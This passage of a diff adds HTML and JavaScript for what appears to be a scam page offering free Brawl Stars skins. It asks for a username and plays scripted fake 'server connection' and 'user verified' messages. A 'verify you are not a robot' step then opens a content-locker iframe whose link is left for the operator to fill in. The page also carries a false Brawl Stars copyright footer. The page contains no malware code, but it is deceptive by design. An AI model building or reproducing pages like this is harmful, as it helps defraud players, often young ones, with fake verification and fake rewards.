+      <button onclick="openModal('Grape', 'https://static.wikia.nocookie.net/brawlstars/images/c/cd/Glowy_Skin-Default.png/revision/latest?cb=20251215172355')">Claim</button>
+    </div>
+    <div class="pack">
+      <img src="https://static.wikia.nocookie.net/brawlstars/images/4/4f/Ziggy_Skin-Default.png/revision/latest/scale-to-width-down/268?cb=20251021214924" alt="Pack 6">
+      <div></div>
+      <button onclick="openModal('Grape', 'https://static.wikia.nocookie.net/brawlstars/images/4/4f/Ziggy_Skin-Default.png/revision/latest/scale-to-width-down/268?cb=20251021214924')">Claim</button>
+    </div>
+	
+  <!-- Modal 1: Player ID -->
+  <div class="modal" id="modal">
+    <div class="modal-content">
+      <button class="close-btn" onclick="closeModal()">×</button>
+      <img id="modal-item-img" src="" alt="Selected Item" class="modal-item-img">
+
+      
+      <p>Enter Your Username </p>
+      <input type="text" placeholder="Enter Username">
+      <button onclick="openGenerateModal()">Next</button>
+    </div>
+  </div>
+
+  <!-- Modal 2: Generate -->
+  <div class="modal-generate" id="modal-generate">
+    <div class="modal-generate-content">
+      <div class="roblox-loader" id="roblox-loader">
+  <div></div><div></div><div></div><div></div>
+</div>
+      <p>Generating...</p>
+      <div class="progress-bar">
+        <div id="progress"></div>
+      </div>
+      <button class="complete-btn" id="complete-btn" onclick="showVerificationModal()">Continue</button>
+    </div>
+  </div>
+
+  <!-- Modal 3: Verification -->
+  <div class="verification-modal" id="verification-modal">
+    <div class="modal-content">
+      <div class="square-loader">
+  <div></div><div></div><div></div><div></div>
+</div>
+
+      <p id="verification-message">Connecting to  brawl stars Servers ...</p>
+      <p id="pre-verify-message" style="display: none;">Please Verify That You Are Not A Robot To Send Your Item Successfully, Click The Button And Complete One Task.</p>
+      <button id="verify-button" class="verify-btn" onclick="_JW();">Verify Now</button> 
+    </div>
+  </div>
+  <div class="popup" id="popup">
+        <div class="popup-content" id="popup-content">
+            
+            <img id="popup-img" src="" alt="Item">
+            <h2 id="popup-title"></h2>
+            <button class="points-btn" id="popup-points" onclick="startLoading()">NEXT</button>
+            <div class="loader" id="loader"></div>
+            <button class="open-btn" id="open-btn" onclick="openLocker()">Open Locker</button>
+        </div>
+    </div>
+
+    <div class="popup" id="locker-popup" style="display: none;">
+        <div class="popup-content locker-popup-content">
+            <iframe id="locker-iframe" class="locker-iframe" src="" title="Locker"></iframe>
+            
+        </div>
+    </div>
+
+  <script>
+    function showCoins() {
+      const gemPacks = document.getElementById('gem-packs');
+      const coinPacks = document.getElementById('coin-packs');
+      const pageTitle = document.getElementById('page-title');
+
+      gemPacks.classList.remove('fade-in');
+      gemPacks.classList.add('fade');
+      setTimeout(() => {
+        gemPacks.style.display = 'none';
+        coinPacks.style.display = 'grid';
+        coinPacks.classList.add('fade-in');
+        pageTitle.textContent = 'Coin Packs';
+      }, 500);
+    }
+
+    function openModal(title, imgSrc) {
+  const modal = document.getElementById('modal');
+  modal.style.display = 'flex';
+
+  const content = modal.querySelector('.modal-content');
+  content.style.animation = 'none';
+  void content.offsetWidth;
+  content.style.animation = 'modalFadeIn 0.4s ease';
+
+  // تحديث الصورة
+  const img = document.getElementById('modal-item-img');
+  if (imgSrc) {
+    img.src = imgSrc;
+    img.style.display = 'block';
+  } else {
+    img.style.display = 'none';
+  }
+}
+
+    function closeModal() {
+      document.getElementById('modal').style.display = 'none';
+    }
+
+    function openGenerateModal() {
+  closeModal();
+
+  const modalGenerate = document.getElementById('modal-generate');
+  const content = modalGenerate.querySelector('.modal-generate-content');
+
+  modalGenerate.style.display = 'flex';
+
+  // إعادة تشغيل الأنيميشن
+  content.style.animation = 'none';
+  void content.offsetWidth;
+  content.style.animation = 'flipIn 0.6s ease-out';
+
+  startProgress();
+}
+
+
+
+    function startProgress() {
+      const progress = document.getElementById('progress');
+      let width = 0;
+      const interval = setInterval(() => {
+        if (width >= 100) {
+          clearInterval(interval);
+          document.getElementById('complete-btn').classList.add('active');
+        } else {
+          width += 10;
+          progress.style.width = width + '%';
+        }
+      }, 500);
+    }
+
+    function showVerificationModal() {
+      document.getElementById('modal-generate').style.display = 'none';
+      const verificationModal = document.getElementById('verification-modal');
+      const verificationMessage = document.getElementById('verification-message');
+      const preVerifyMessage = document.getElementById('pre-verify-message');
+      const verifyButton = document.getElementById('verify-button');
+
+      verificationModal.style.display = 'flex';
+
+      let step = 0;
+      const steps = [
+        "Connecting to brawl stars...",
+        "Connected server successfully!",
+        "Verifying user...",
+        "User verified successfully!",
+        "Finalizing..."
+      ];
+
+      const interval = setInterval(() => {
+        if (step < steps.length) {
+          verificationMessage.textContent = steps[step];
+          verificationMessage.style.color = step === 1 || step === 3 ? "green" : "#49a3f2";
+          step++;
+        } else {
+          clearInterval(interval);
+          verificationMessage.textContent = "LAST STEP!";
+          verificationMessage.style.color = "green";
+          preVerifyMessage.style.display = 'block';
+          verifyButton.classList.add('active');
+        }
+      }, 2000);
+    }
+
+    function completeVerification() {
+      alert("Verification successful! You can now claim your gems.");
+      window.location.href = "final-page.html";
+    }
+    function openPopup(title, imgSrc, points) {
+            document.getElementById("popup-title").innerText = "Claim " + title;
+            document.getElementById("popup-img").src = imgSrc;
+            document.getElementById("popup-points").innerText = points + " NEXT";
+            document.getElementById("popup").style.display = "flex";
+            document.getElementById("popup-points").style.display = "block";
+            document.getElementById("loader").style.display = "none";
+            document.getElementById("open-btn").style.display = "none";
+        }
+
+        function closePopup() {
+            document.getElementById("popup").style.display = "none";
+        }
+
+        function startLoading() {
+            let popupContent = document.getElementById("popup-content");
+
+            document.getElementById("popup-points").style.opacity = "0";
+            popupContent.classList.add("shake");
+
+            setTimeout(() => {
+                popupContent.classList.remove("shake");
+                document.getElementById("popup-points").style.display = "none";
+                document.getElementById("loader").style.display = "block";
+            }, 500);
+
+            setTimeout(() => {
+                document.getElementById("loader").style.display = "none";
+                document.getElementById("open-btn").style.display = "block";
+            }, 5000);
+        }
+
+        function openLocker() {
+            // فتح رابط اللوكر داخل نافذة منبثقة
+            document.getElementById("locker-popup").style.display = "flex";
+            document.getElementById("locker-iframe").src = ""; // رابط اللوكر الخاص بك
+
+            // ضبط الأبعاد تلقائيًا بناءً على محتوى الـ iframe
+            document.getElementById("locker-iframe").onload = function() {
+                let iframe = document.getElementById("locker-iframe");
+                let iframeContentHeight = iframe.contentWindow.document.body.scrollHeight;
+                let iframeContentWidth = iframe.contentWindow.document.body.scrollWidth;
+                iframe.style.height = iframeContentHeight + "px";
+                iframe.style.width = iframeContentWidth + "px";
+            }
+        }
+
+        function closeLocker() {
+            document.getElementById("locker-popup").style.display = "none";
+            document.getElementById("locker-iframe").src = ""; // إيقاف المحتوى في الإطار
+        }
+    
+  
+function showPopup(itemTitle, itemImg) {
+  const popup = document.getElementById("purchase-popup");
+  const popupContent = document.getElementById("popup-content");
+
+  popupContent.innerHTML = `
+    <div class="popup-header">
+      <h3>Get Item</h3>
+    </div>
+    <div class="selected-images-container">
+      <img src="${itemImg}" alt="Selected Item" class="item-popup-image-small">
+    </div>
+    <p class="item-confirm">Would you like to get "<span>${itemTitle}</span>"?</p>
+    <div class="input-group">
+      <input type="text" id="username-input" placeholder="Enter your Username">
+    </div>
+    <div class="popup-buttons">
+      <button class="cancel-btn" onclick="closePurchasePopup()">Cancel</button>
+      <button class="free-btn" onclick="completeVerification()">Free</button>
+    </div>
+  `;
+
+  popup.style.display = "flex";
+}
+
+function closePurchasePopup() {
+  document.getElementById("purchase-popup").style.display = "none";
+}
+
+</script>
+  <!-- Footer Section -->
+  <div class="footer">
+    © 2026 brawl stars . All rights reserved.
+  </div>
+
+
+<div class="purchase-popup" id="purchase-popup">
+  <div class="popup-content" id="popup-content"></div>
+</div>
+
+
+
+<!-- 'Es liegt in deiner Verantwortung, deine Besucher über die in deinem Blog verwendeten Cookies und die dort erfassten Daten zu informieren. Blogger stellt dafür eine Standardbenachrichtigung zur Verfügung, die du übernehmen, anpassen oder durch deine eigene Mitteilung ersetzen kannst. Weitere Informationen findest du unter http://www.blogger.com/go/cookiechoices.' -->
+<script src="/js/cookienotice.js" defer=""></script>
+<script>
+  document.addEventListener('DOMContentLoaded', function(event) {
+    window.cookieChoices && cookieChoices.showCookieConsentBar && cookieChoices.showCookieConsentBar(
+        (window.cookieOptions && cookieOptions.msg) || 'Diese Website verwendet Cookies von Google, um Dienste anzubieten und Zugriffe zu analysieren. Deine IP-Adresse und dein User-Agent werden zusammen mit Messwerten zur Leistung und Sicherheit für Google freigegeben. So können Nutzungsstatistiken generiert, Missbrauchsfälle erkannt und behoben und die Qualität des Dienstes gewährleistet werden.',
+        (window.cookieOptions && cookieOptions.close) || 'Ok',
+        (window.cookieOptions && cookieOptions.learn) || 'Weitere Informationen',
+        (window.cookieOptions && cookieOptions.link) || 'https://www.blogger.com/go/blogspot-cookies');
+  });
+</script>
+
+
+
+<!-- 'Il est de votre ressort d\x27informer les visiteurs à propos des cookies utilisés et des données collectées sur votre blog. Blogger met à votre disposition une notification standard que vous pouvez personnaliser, remplacer ou afficher telle quelle sur votre blog. Rendez-vous sur http://www.blogger.com/go/cookiechoices pour obtenir de plus amples informations.' -->
+<script src="/js/cookienotice.js" defer=""></script>
+<script>
+  document.addEventListener('DOMContentLoaded', function(event) {
+    window.cookieChoices && cookieChoices.showCookieConsentBar && cookieChoices.showCookieConsentBar(
+        (window.cookieOptions && cookieOptions.msg) || 'Ce site utilise des cookies provenant de Google pour fournir ses services et analyser le trafic. Votre adresse IP et votre user-agent, ainsi que des statistiques relatives aux performances et à la sécurité, sont transmis à Google afin d\x27assurer un service de qualité, de générer des statistiques d\x27utilisation, et de détecter et de résoudre les problèmes d\x27abus.',
+        (window.cookieOptions && cookieOptions.close) || 'OK !',
+        (window.cookieOptions && cookieOptions.learn) || 'En savoir plus',
+        (window.cookieOptions && cookieOptions.link) || 'https://www.blogger.com/go/blogspot-cookies');
+  });
+</script>
+
+
+</div></body></html>
